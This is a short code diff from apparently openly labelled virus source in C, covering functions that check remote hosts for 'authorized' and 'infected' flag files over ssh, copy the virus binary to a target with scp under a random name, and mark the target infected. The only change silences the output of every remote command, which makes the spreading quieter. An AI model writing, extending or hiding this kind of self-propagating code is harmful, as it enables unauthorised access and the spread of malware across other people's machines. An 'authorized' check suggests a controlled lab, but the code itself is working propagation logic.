@@ -43,7 +43,7 @@ void generate_random_seed(char *seed) {
 
 bool is_authorized(char *ip) {
     char cmd_buffer[256];
-    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s", ip, VIRUS_WOKRING_DIR, ALLOWED_FLAG);
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s > /dev/null 2>&1", ip, VIRUS_WOKRING_DIR, ALLOWED_FLAG);
     if(system(cmd_buffer) == 0) {
         return true;
     } else {
@@ -53,7 +53,7 @@ bool is_authorized(char *ip) {
 
 bool is_infected(char *ip) {
     char cmd_buffer[256];
-    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s", ip, VIRUS_WOKRING_DIR, INFECTED_FLAG);
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s > /dev/null 2>&1", ip, VIRUS_WOKRING_DIR, INFECTED_FLAG);
     if(system(cmd_buffer) == 0) {
         return true;
     } else {
@@ -91,10 +91,10 @@ void execute_payload(char *virus_name, char *target_ip_buff) {
         rnd_name_buffer[FILENAME_SIZE];
     // copy virus in tmpfs
     generate_random_string(rnd_name_buffer);
-    snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:%s/%s", virus_name, target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:%s/%s > /dev/null 2>&1", virus_name, target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
     system(cmd_buffer);
     // add infected flag
-    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s touch %s/%s", target_ip_buff, VIRUS_WOKRING_DIR, INFECTED_FLAG);
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s touch %s/%s > /dev/null 2>&1", target_ip_buff, VIRUS_WOKRING_DIR, INFECTED_FLAG);
     system(cmd_buffer);
 }
 
